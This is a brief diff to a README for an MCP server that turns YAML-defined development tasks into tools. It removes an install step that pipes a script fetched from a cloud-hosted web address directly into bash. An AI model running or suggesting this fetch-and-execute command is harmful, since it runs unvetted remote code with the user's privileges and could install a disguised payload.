@@ -2,12 +2,6 @@
 
 MCP server that exposes development tasks defined in YAML as MCP tools.
 
-## Install
-
-```bash
-curl -fsSL https://runbookproduction.z13.web.core.windows.net/install.sh | bash
-```
-
 ## Build
 
 ```bash
